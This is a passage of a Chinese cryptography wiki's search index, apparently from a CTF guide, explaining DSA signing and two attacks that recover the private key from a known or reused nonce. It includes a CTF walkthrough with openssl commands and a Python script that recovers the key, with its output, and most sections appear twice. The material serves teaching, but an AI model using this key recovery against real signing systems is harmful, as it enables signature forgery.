q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw} v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw} \u53c8 s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q \u4e14 w=s^{-1} \\bmod q w=s^{-1} \\bmod q \u6240\u4ee5 k \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q k \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q \u6240\u4ee5 v \\equiv g^k v \\equiv g^k \u3002\u6b63\u786e\u6027\u5f97\u8bc1\u3002 \u5b89\u5168\u6027 \u00b6 \u5df2\u77e5k \u00b6 \u539f\u7406 \u00b6 \u5982\u679c\u77e5\u9053\u4e86\u968f\u673a\u5bc6\u94a5k\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6839\u636e s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q \u8ba1\u7b97\u79c1\u94a5d\uff0c\u51e0\u4e4e\u653b\u7834\u4e86DSA\u3002 \u8fd9\u91cc\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6d88\u606f\u7684hash\u503c\u90fd\u4f1a\u7ed9\u51fa\u3002 x \\equiv r^{-1}(ks-H(m)) \\bmod q x \\equiv r^{-1}(ks-H(m)) \\bmod q k\u5171\u4eab \u00b6 \u539f\u7406 \u00b6 \u5982\u679c\u5728\u4e24\u6b21\u7b7e\u540d\u7684\u8fc7\u7a0b\u4e2d\u5171\u4eab\u4e86k\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884c\u653b\u51fb\u3002 \u5047\u8bbe\u7b7e\u540d\u7684\u6d88\u606f\u4e3am1,m2\uff0c\u663e\u7136\uff0c\u4e24\u8005\u7684r\u7684\u503c\u4e00\u6837\uff0c\u6b64\u5916 s_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q s_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q s_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q s_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q \u8fd9\u91cc\u6211\u4eec\u9664\u4e86x\u548ck\u4e0d\u77e5\u9053\u5269\u4e0b\u7684\u5747\u77e5\u9053\uff0c\u90a3\u4e48 s_1k \\equiv H(m_1)+xr s_1k \\equiv H(m_1)+xr s_2k \\equiv H(m_2)+xr s_2k \\equiv H(m_2)+xr \u4e24\u5f0f\u76f8\u51cf k(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q k(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q \u6b64\u65f6 \u5373\u53ef\u89e3\u51fak\uff0c\u8fdb\u4e00\u6b65\u6211\u4eec\u53ef\u4ee5\u89e3\u51fax\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5\u6e56\u6e58\u676f\u7684DSA\u4e3a\u4f8b\uff0c\u4f46\u662f\u4e0d\u80fd\u76f4\u63a5\u53bb\u505a\uff0c\uff0c\uff0c\u56e0\u4e3a\u53d1\u73b0\u5728\u9a8c\u8bc1message4\u7684\u65f6\u5019\u7b7e\u540d\u4e0d\u901a\u8fc7\u3002\u6e90\u9898\u76ee\u6211\u6ca1\u6709\u4e86\uff0c\u3002\uff0c\uff0c\u8fd9\u91cc\u6211\u4ee5Jarvis OJ\u4e2d\u7ecf\u8fc7\u4fee\u6539\u7684\u9898\u76eeDSA\u4e3a\u4f8b \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet1/sign1.bin packet1/message1 Verified OK \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin packet2/message1 packet2/message1: No such file or directory \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin packet2/message2 Verified OK \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet3/sign3.bin packet3/message3 Verified OK \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet4/sign4.bin packet4/message4 Verified OK \u53ef\u4ee5\u770b\u51fa\u56db\u5219\u6d88\u606f\u5168\u90e8\u6821\u9a8c\u901a\u8fc7\u3002\u8fd9\u91cc\u4e4b\u6240\u4ee5\u4f1a\u8054\u60f3\u5230\u5171\u4eabk\u662f\u56e0\u4e3a\u9898\u76ee\u4e2d\u63d0\u793a\u4e86PS3\u7684\u7834\u89e3\u66fe\u7528\u5230\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u4ece\u7f51\u4e0a\u641c\u7d22\u53ef\u77e5\u8be5\u653b\u51fb\u3002 \u4e0b\u9762\uff0c\u6211\u4eec\u770b\u4e00\u4e0b\u7b7e\u540d\u540e\u7684\u503c\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u547d\u4ee4\u5982\u4e0b \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet4/sign4.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 :d = 1 hl = 2 l = 20 prim: INTEGER :5090DA81FEDE048D706D80E0AC47701E5A9EF1CC 24 :d = 1 hl = 2 l = 20 prim: INTEGER :5E10DED084203CCBCEC3356A2CA02FF318FD4123 \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet3/sign3.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 :d = 1 hl = 2 l = 20 prim: INTEGER :5090DA81FEDE048D706D80E0AC47701E5A9EF1CC 24 :d = 1 hl = 2 l = 20 prim: INTEGER :30EB88E6A4BFB1B16728A974210AE4E41B42677D \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet2/sign2.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 :d = 1 hl = 2 l = 20 prim: INTEGER :60B9F2A5BA689B802942D667ED5D1EED066C5A7F 24 :d = 1 hl = 2 l = 20 prim: INTEGER :3DC8921BA26B514F4D991A85482750E0225A15B5 \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet1/sign1.bin 0 :d = 0 hl = 2 l = 45 cons: SEQUENCE 2 :d = 1 hl = 2 l = 21 prim: INTEGER :8158B477C5AA033D650596E93653C730D26BA409 25 :d = 1 hl = 2 l = 20 prim: INTEGER :165B9DD1C93230C31111E5A4E6EB5181F990F702 \u5176\u4e2d\uff0c\u83b7\u53d6\u7684\u7b2c\u4e00\u4e2a\u503c\u662fr\uff0c\u7b2c\u4e8c\u4e2a\u503c\u662fs\u3002\u53ef\u4ee5\u770b\u5230\u7b2c4\u4e2apacket\u548c\u7b2c3\u4e2apacket\u5171\u4eab\u4e86k\uff0c\u56e0\u4e3a\u4ed6\u4eec\u7684r\u4e00\u81f4\u3002 \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528openssl\u770b\u4e0b\u516c\u94a5 \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl dsa -in dsa_public.pem -text -noout -pubin read DSA key pub: 45 :bb:18:f6:0e:b0:51:f9:d4:82:18:df:8c:d9:56: 33 :0a:4f:f3:0a:f5:34:4f:6c:95:40:06:1d:53:83: 29 :2d:95:c4:df:c8:ac:26:ca:45:2e:17:0d:c7:9b: e1:5c:c6:15:9e:03:7b:cc:f5:64:ef:36:1c:18:c9: 9e:8a:eb:0b:c1:ac:f9:c0:c3:5d:62:0d:60:bb:73: 11 :f1:cf:08:cf:bc:34:cc:aa:79:ef:1d:ad:8a:7a: 6f:ac:ce:86:65:90:06:d4:fa:f0:57:71:68:57:ec: 7c:a6:04:ad:e2:c3:d7:31:d6:d0:2f:93:31:98:d3: 90 :c3:ef:c3:f3:ff:04:6f P: 00 :c0:59:6c:3b:5e:93:3d:33:78:be:36:26:be:31: 5e:e7:0c:a6:b5:b1:1a:51:9b:55:23:d4:0e:5b:a7: 45 :66:e2:2c:c8:8b:fe:c5:6a:ad:66:91:8b:9b:30: ad:28:13:88:f0:bb:c6:b8:02:6b:7c:80:26:e9:11: 84 :be:e0:c8:ad:10:cc:f2:96:be:cf:e5:05:05:38: 3c:b4:a9:54:b3:7c:b5:88:67:2f:7c:09:57:b6:fd: f2:fa:05:38:fd:ad:83:93:4a:45:e4:f9:9d:38:de: 57 :c0:8a:24:d0:0d:1c:c5:d5:fb:db:73:29:1c:d1: 0c:e7:57:68:90:b6:ba:08:9b Q: 00 :86:8f:78:b8:c8:50:0b:eb:f6:7a:58:e3:3c:1f: 53 :9d:35:70:d1:bd G: 4c:d5:e6:b6:6a:6e:b7:e9:27:94:e3:61:1f:41:53: cb:11:af:5a:08:d9:d4:f8:a3:f2:50:03:72:91:ba: 5f:ff:3c:29:a8:c3:7b:c4:ee:5f:98:ec:17:f4:18: bc:71:61:01:6c:94:c8:49:02:e4:00:3a:79:87:f0: d8:cf:6a:61:c1:3a:fd:56:73:ca:a5:fb:41:15:08: cd:b3:50:1b:df:f7:3e:74:79:25:f7:65:86:f4:07: 9f:ea:12:09:8b:34:50:84:4a:2a:9e:5d:0a:99:bd: 86 :5e:05:70:d5:19:7d:f4:a1:c9:b8:01:8f:b9:9c: dc:e9:15:7b:98:50:01:79 \u4e0b\u9762\uff0c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u4e0a\u9762\u7684\u539f\u7406\u7f16\u5199\u7a0b\u5e8f\u5373\u53ef\uff0c\u7a0b\u5e8f\u5982\u4e0b #coding=utf8 from Crypto.PublicKey import DSA from hashlib import sha1 import gmpy2 with open ( './dsa_public.pem' ) as f : key = DSA . importKey ( f ) y = key . y g = key . g p = key . p q = key . q f3 = open ( r \"packet3/message3\" , 'r' ) f4 = open ( r \"packet4/message4\" , 'r' ) data3 = f3 . read () data4 = f4 . read () sha = sha1 () sha . update ( data3 ) m3 = int ( sha . hexdigest (), 16 ) sha = sha1 () sha . update ( data4 ) m4 = int ( sha . hexdigest (), 16 ) print m3 , m4 s3 = 0x30EB88E6A4BFB1B16728A974210AE4E41B42677D s4 = 0x5E10DED084203CCBCEC3356A2CA02FF318FD4123 r = 0x5090DA81FEDE048D706D80E0AC47701E5A9EF1CC ds = s4 - s3 dm = m4 - m3 k = gmpy2 . mul ( dm , gmpy2 . invert ( ds , q )) k = gmpy2 . f_mod ( k , q ) tmp = gmpy2 . mul ( k , s3 ) - m3 x = tmp * gmpy2 . invert ( r , q ) x = gmpy2 . f_mod ( x , q ) print int ( x ) \u6211\u53d1\u73b0pip\u5b89\u88c5\u7684pycrypto\u7adf\u7136\u6ca1\u6709DSA\u7684importKey\u51fd\u6570\u3002\u3002\u3002\u53ea\u597d\u4ecegithub\u4e0a\u4e0b\u8f7d\u5b89\u88c5\u4e86pycrypto\u3002\u3002\u3002 \u7ed3\u679c\u5982\u4e0b \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 python exp.py 1104884177962524221174509726811256177146235961550 943735132044536149000710760545778628181961840230 520793588153805320783422521615148687785086070744","title":"DSA \u6570\u5b57\u7b7e\u540d"},{"location":"crypto/signature/dsa/#dsa","text":"\u4e0a\u9762\u6240\u63cf\u8ff0\u7684ElGamal\u7b7e\u540d\u7b97\u6cd5\u5728\u5b9e\u9645\u4e2d\u5e76\u4e0d\u5e38\u7528\uff0c\u66f4\u5e38\u7528\u7684\u662f\u5176\u53d8\u4f53DSA\u3002","title":"DSA"},{"location":"crypto/signature/dsa/#_1","text":"","title":"\u57fa\u672c\u539f\u7406"},{"location":"crypto/signature/dsa/#_2","text":"\u9009\u62e9\u4e00\u4e2a\u5408\u9002\u7684\u54c8\u5e0c\u51fd\u6570\uff0c\u76ee\u524d\u4e00\u822c\u9009\u62e9SHA1\uff0c\u5f53\u524d\u4e5f\u53ef\u4ee5\u9009\u62e9\u5f3a\u5ea6\u66f4\u9ad8\u7684\u54c8\u5e0c\u51fd\u6570H\u3002 \u9009\u62e9\u5bc6\u94a5\u7684\u957f\u5ea6L\u548cN\uff0c\u8fd9\u4e24\u4e2a\u503c\u51b3\u5b9a\u4e86\u7b7e\u540d\u7684\u5b89\u5168\u7a0b\u5ea6\u3002\u5728\u6700\u521d\u7684DSS\uff08 Digital Signature Standard \uff09\u4e2d\u5efa\u8baeL\u5fc5\u987b\u4e3a64\u7684\u500d\u6570\uff0c\u5e76\u4e14 512 \\leq L \\leq 1024 512 \\leq L \\leq 1024 \uff0c\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u66f4\u5927\u3002N\u5fc5\u987b\u5927\u5c0f\u5fc5\u987b\u4e0d\u5927\u4e8e\u54c8\u5e0c\u51fd\u6570H\u8f93\u51fa\u7684\u957f\u5ea6\u3002FIPS 186-3\u7ed9\u51fa\u4e86\u4e00\u4e9b\u5efa\u8bae\u7684L\u548cN\u7684\u53d6\u503c\u4f8b\u5b50\uff1a(1024, 160)\uff0c (2048, 224)\uff0c (2048, 256)\uff0c\u4ee5\u53ca (3,072, 256)\u3002 \u9009\u62e9N\u6bd4\u7279\u7684\u7d20\u6570q\u3002 \u9009\u62e9L\u6bd4\u7279\u7684\u7d20\u6570p\uff0c\u4f7f\u5f97p-1\u662fq\u7684\u500d\u6570\u3002 \u9009\u62e9\u6ee1\u8db3 g^k \\equiv 1 \\bmod p g^k \\equiv 1 \\bmod p \u7684\u6700\u5c0f\u6b63\u6574\u6570k\u4e3aq\u7684g\uff0c\u5373\u5728\u6a21p\u7684\u80cc\u666f\u4e0b\uff0cord(g)=q\u7684g\u3002\u5373g\u5728\u6a21p\u7684\u610f\u4e49\u4e0b\uff0c\u5176\u6307\u6570\u6b21\u5e42\u53ef\u4ee5\u751f\u6210\u5177\u6709q\u4e2a\u5143\u7d20\u7684\u5b50\u7fa4\u3002\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97 g=h^{\\frac{p-1}{q}} \\bmod p g=h^{\\frac{p-1}{q}} \\bmod p \u6765\u5f97\u5230g\uff0c\u5176\u4e2d 1< h < p-1 1< h < p-1 \u3002 \u9009\u62e9\u79c1\u94a5x\uff0c 0<x<q 0<x<q \uff0c\u8ba1\u7b97 y \\equiv g^x \\bmod p y \\equiv g^x \\bmod p \u3002 \u516c\u94a5\u4e3a(p,q,g,y)\uff0c\u79c1\u94a5\u4e3a(x)\u3002","title":"\u5bc6\u94a5\u751f\u6210"},{"location":"crypto/signature/dsa/#_3","text":"\u7b7e\u540d\u6b65\u9aa4\u5982\u4e0b \u9009\u62e9\u968f\u673a\u6574\u6570\u6570k\u4f5c\u4e3a\u4e34\u65f6\u5bc6\u94a5\uff0c 0<k<q 0<k<q \u3002 \u8ba1\u7b97 r\\equiv (g^k \\bmod p) \\bmod q r\\equiv (g^k \\bmod p) \\bmod q \u8ba1\u7b97 s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q \u7b7e\u540d\u7ed3\u679c\u4e3a(r,s)\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u4e0eElgamal\u5f88\u91cd\u8981\u7684\u4e0d\u540c\u662f\u8fd9\u91cc\u4f7f\u7528\u4e86\u54c8\u5e0c\u51fd\u6570\u5bf9\u6d88\u606f\u8fdb\u884c\u4e86\u54c8\u5e0c\u5904\u7406\u3002","title":"\u7b7e\u540d"},{"location":"crypto/signature/dsa/#_4","text":"\u9a8c\u8bc1\u8fc7\u7a0b\u5982\u4e0b \u8ba1\u7b97\u8f85\u52a9\u503c\uff0c w=s^{-1} \\bmod q w=s^{-1} \\bmod q \u8ba1\u7b97\u8f85\u52a9\u503c\uff0c u_1=H(m)w \\bmod q u_1=H(m)w \\bmod q \u8ba1\u7b97\u8f85\u52a9\u503c\uff0c u_2=rw \\bmod q u_2=rw \\bmod q \u8ba1\u7b97 v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q \u5982\u679cv\u4e0er\u76f8\u7b49\uff0c\u5219\u6821\u9a8c\u6210\u529f\u3002","title":"\u9a8c\u8bc1"},{"location":"crypto/signature/dsa/#_5","text":"\u9996\u5148\uff0cg \u6ee1\u8db3 g^k \\equiv 1 \\bmod p g^k \\equiv 1 \\bmod p \u7684\u6700\u5c0f\u6b63\u6574\u6570k\u4e3aq\u3002\u6240\u4ee5 g^q \\equiv 1 \\bmod p g^q \\equiv 1 \\bmod p \u3002\u6240\u4ee5 g^x \\equiv g^{x \\bmod q} \\bmod p g^x \\equiv g^{x \\bmod q} \\bmod p \u3002\u8fdb\u800c v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw} v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw} \u53c8 s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q \u4e14 w=s^{-1} \\bmod q w=s^{-1} \\bmod q \u6240\u4ee5 k \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q k \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q \u6240\u4ee5 v \\equiv g^k v \\equiv g^k \u3002\u6b63\u786e\u6027\u5f97\u8bc1\u3002","title":"\u6b63\u786e\u6027\u63a8\u5bfc"},{"location":"crypto/signature/dsa/#_6","text":"","title":"\u5b89\u5168\u6027"},{"location":"crypto/signature/dsa/#k","text":"","title":"\u5df2\u77e5k"},{"location":"crypto/signature/dsa/#_7","text":"\u5982\u679c\u77e5\u9053\u4e86\u968f\u673a\u5bc6\u94a5k\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6839\u636e s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q \u8ba1\u7b97\u79c1\u94a5d\uff0c\u51e0\u4e4e\u653b\u7834\u4e86DSA\u3002 \u8fd9\u91cc\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6d88\u606f\u7684hash\u503c\u90fd\u4f1a\u7ed9\u51fa\u3002 x \\equiv r^{-1}(ks-H(m)) \\bmod q x \\equiv r^{-1}(ks-H(m)) \\bmod q","title":"\u539f\u7406"},{"location":"crypto/signature/dsa/#k_1","text":"","title":"k\u5171\u4eab"},{"location":"crypto/signature/dsa/#_8","text":"\u5982\u679c\u5728\u4e24\u6b21\u7b7e\u540d\u7684\u8fc7\u7a0b\u4e2d\u5171\u4eab\u4e86k\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884c\u653b\u51fb\u3002 \u5047\u8bbe\u7b7e\u540d\u7684\u6d88\u606f\u4e3am1,m2\uff0c\u663e\u7136\uff0c\u4e24\u8005\u7684r\u7684\u503c\u4e00\u6837\uff0c\u6b64\u5916 s_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q s_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q s_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q s_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q \u8fd9\u91cc\u6211\u4eec\u9664\u4e86x\u548ck\u4e0d\u77e5\u9053\u5269\u4e0b\u7684\u5747\u77e5\u9053\uff0c\u90a3\u4e48 s_1k \\equiv H(m_1)+xr s_1k \\equiv H(m_1)+xr s_2k \\equiv H(m_2)+xr s_2k \\equiv H(m_2)+xr \u4e24\u5f0f\u76f8\u51cf k(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q k(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q \u6b64\u65f6 \u5373\u53ef\u89e3\u51fak\uff0c\u8fdb\u4e00\u6b65\u6211\u4eec\u53ef\u4ee5\u89e3\u51fax\u3002","title":"\u539f\u7406"},{"location":"crypto/signature/dsa/#_9","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5\u6e56\u6e58\u676f\u7684DSA\u4e3a\u4f8b\uff0c\u4f46\u662f\u4e0d\u80fd\u76f4\u63a5\u53bb\u505a\uff0c\uff0c\uff0c\u56e0\u4e3a\u53d1\u73b0\u5728\u9a8c\u8bc1message4\u7684\u65f6\u5019\u7b7e\u540d\u4e0d\u901a\u8fc7\u3002\u6e90\u9898\u76ee\u6211\u6ca1\u6709\u4e86\uff0c\u3002\uff0c\uff0c\u8fd9\u91cc\u6211\u4ee5Jarvis OJ\u4e2d\u7ecf\u8fc7\u4fee\u6539\u7684\u9898\u76eeDSA\u4e3a\u4f8b \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet1/sign1.bin packet1/message1 Verified OK \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin packet2/message1 packet2/message1: No such file or directory \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin packet2/message2 Verified OK \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet3/sign3.bin packet3/message3 Verified OK \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet4/sign4.bin packet4/message4 Verified OK \u53ef\u4ee5\u770b\u51fa\u56db\u5219\u6d88\u606f\u5168\u90e8\u6821\u9a8c\u901a\u8fc7\u3002\u8fd9\u91cc\u4e4b\u6240\u4ee5\u4f1a\u8054\u60f3\u5230\u5171\u4eabk\u662f\u56e0\u4e3a\u9898\u76ee\u4e2d\u63d0\u793a\u4e86PS3\u7684\u7834\u89e3\u66fe\u7528\u5230\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u4ece\u7f51\u4e0a\u641c\u7d22\u53ef\u77e5\u8be5\u653b\u51fb\u3002 \u4e0b\u9762\uff0c\u6211\u4eec\u770b\u4e00\u4e0b\u7b7e\u540d\u540e\u7684\u503c\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u547d\u4ee4\u5982\u4e0b \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet4/sign4.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 :d = 1 hl = 2 l = 20 prim: INTEGER :5090DA81FEDE048D706D80E0AC47701E5A9EF1CC 24 :d = 1 hl = 2 l = 20 prim: INTEGER :5E10DED084203CCBCEC3356A2CA02FF318FD4123 \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet3/sign3.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 :d = 1 hl = 2 l = 20 prim: INTEGER :5090DA81FEDE048D706D80E0AC47701E5A9EF1CC 24 :d = 1 hl = 2 l = 20 prim: INTEGER :30EB88E6A4BFB1B16728A974210AE4E41B42677D \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet2/sign2.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 :d = 1 hl = 2 l = 20 prim: INTEGER :60B9F2A5BA689B802942D667ED5D1EED066C5A7F 24 :d = 1 hl = 2 l = 20 prim: INTEGER :3DC8921BA26B514F4D991A85482750E0225A15B5 \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet1/sign1.bin 0 :d = 0 hl = 2 l = 45 cons: SEQUENCE 2 :d = 1 hl = 2 l = 21 prim: INTEGER :8158B477C5AA033D650596E93653C730D26BA409 25 :d = 1 hl = 2 l = 20 prim: INTEGER :165B9DD1C93230C31111E5A4E6EB5181F990F702 \u5176\u4e2d\uff0c\u83b7\u53d6\u7684\u7b2c\u4e00\u4e2a\u503c\u662fr\uff0c\u7b2c\u4e8c\u4e2a\u503c\u662fs\u3002\u53ef\u4ee5\u770b\u5230\u7b2c4\u4e2apacket\u548c\u7b2c3\u4e2apacket\u5171\u4eab\u4e86k\uff0c\u56e0\u4e3a\u4ed6\u4eec\u7684r\u4e00\u81f4\u3002 \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528openssl\u770b\u4e0b\u516c\u94a5 \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl dsa -in dsa_public.pem -text -noout -pubin read DSA key pub: 45 :bb:18:f6:0e:b0:51:f9:d4:82:18:df:8c:d9:56: 33 :0a:4f:f3:0a:f5:34:4f:6c:95:40:06:1d:53:83: 29 :2d:95:c4:df:c8:ac:26:ca:45:2e:17:0d:c7:9b: e1:5c:c6:15:9e:03:7b:cc:f5:64:ef:36:1c:18:c9: 9e:8a:eb:0b:c1:ac:f9:c0:c3:5d:62:0d:60:bb:73: 11 :f1:cf:08:cf:bc:34:cc:aa:79:ef:1d:ad:8a:7a: 6f:ac:ce:86:65:90:06:d4:fa:f0:57:71:68:57:ec: 7c:a6:04:ad:e2:c3:d7:31:d6:d0:2f:93:31:98:d3: 90 :c3:ef:c3:f3:ff:04:6f P: 00 :c0:59:6c:3b:5e:93:3d:33:78:be:36:26:be:31: 5e:e7:0c:a6:b5:b1:1a:51:9b:55:23:d4:0e:5b:a7: 45 :66:e2:2c:c8:8b:fe:c5:6a:ad:66:91:8b:9b:30: ad:28:13:88:f0:bb:c6:b8:02:6b:7c:80:26:e9:11: 84 :be:e0:c8:ad:10:cc:f2:96:be:cf:e5:05:05:38: 3c:b4:a9:54:b3:7c:b5:88:67:2f:7c:09:57:b6:fd: f2:fa:05:38:fd:ad:83:93:4a:45:e4:f9:9d:38:de: 57 :c0:8a:24:d0:0d:1c:c5:d5:fb:db:73:29:1c:d1: 0c:e7:57:68:90:b6:ba:08:9b Q: 00 :86:8f:78:b8:c8:50:0b:eb:f6:7a:58:e3:3c:1f: 53 :9d:35:70:d1:bd G: 4c:d5:e6:b6:6a:6e:b7:e9:27:94:e3:61:1f:41:53: cb:11:af:5a:08:d9:d4:f8:a3:f2:50:03:72:91:ba: 5f:ff:3c:29:a8:c3:7b:c4:ee:5f:98:ec:17:f4:18: bc:71:61:01:6c:94:c8:49:02:e4:00:3a:79:87:f0: d8:cf:6a:61:c1:3a:fd:56:73:ca:a5:fb:41:15:08: cd:b3:50:1b:df:f7:3e:74:79:25:f7:65:86:f4:07: 9f:ea:12:09:8b:34:50:84:4a:2a:9e:5d:0a:99:bd: 86 :5e:05:70:d5:19:7d:f4:a1:c9:b8:01:8f:b9:9c: dc:e9:15:7b:98:50:01:79 \u4e0b\u9762\uff0c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u4e0a\u9762\u7684\u539f\u7406\u7f16\u5199\u7a0b\u5e8f\u5373\u53ef\uff0c\u7a0b\u5e8f\u5982\u4e0b #coding=utf8 from Crypto.PublicKey import DSA from hashlib import sha1 import gmpy2 with open ( './dsa_public.pem' ) as f : key = DSA . importKey ( f ) y = key . y g = key . g p = key . p q = key . q f3 = open ( r \"packet3/message3\" , 'r' ) f4 = open ( r \"packet4/message4\" , 'r' ) data3 = f3 . read () data4 = f4 . read () sha = sha1 () sha . update ( data3 ) m3 = int ( sha . hexdigest (), 16 ) sha = sha1 () sha . update ( data4 ) m4 = int ( sha . hexdigest (), 16 ) print m3 , m4 s3 = 0x30EB88E6A4BFB1B16728A974210AE4E41B42677D s4 = 0x5E10DED084203CCBCEC3356A2CA02FF318FD4123 r = 0x5090DA81FEDE048D706D80E0AC47701E5A9EF1CC ds = s4 - s3 dm = m4 - m3 k = gmpy2 . mul ( dm , gmpy2 . invert ( ds , q )) k = gmpy2 . f_mod ( k , q ) tmp = gmpy2 . mul ( k , s3 ) - m3 x = tmp * gmpy2 . invert ( r , q ) x = gmpy2 . f_mod ( x , q ) print int ( x ) \u6211\u53d1\u73b0pip\u5b89\u88c5\u7684pycrypto\u7adf\u7136\u6ca1\u6709DSA\u7684importKey\u51fd\u6570\u3002\u3002\u3002\u53ea\u597d\u4ecegithub\u4e0a\u4e0b\u8f7d\u5b89\u88c5\u4e86pycrypto\u3002\u3002\u3002 \u7ed3\u679c\u5982\u4e0b \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 python exp.py 1104884177962524221174509726811256177146235961550 943735132044536149000710760545778628181961840230 520793588153805320783422521615148687785086070744","title":"\u4f8b\u5b50"},{"location":"crypto/signature/elgamal/","text":"ElGamal \u00b6 RSA\u7684\u6570\u5b57\u7b7e\u540d\u65b9\u6848\u51e0\u4e4e\u4e0e\u5176\u52a0\u5bc6\u65b9\u6848\u5b8c\u5168\u4e00\u81f4\uff0c\u53ea\u662f\u5229\u7528\u79c1\u94a5\u8fdb\u884c\u4e86\u7b7e\u540d\u3002\u4f46\u662f\uff0c\u5bf9\u4e8eElGamal\u6765\u8bf4\uff0c\u5176\u7b7e\u540d\u65b9\u6848\u4e0e\u76f8\u5e94\u7684\u52a0\u5bc6\u65b9\u6848\u5177\u6709\u5f88\u5927\u533a\u522b\u3002 \u57fa\u672c\u539f\u7406 \u00b6 \u5bc6\u94a5\u751f\u6210 \u00b6 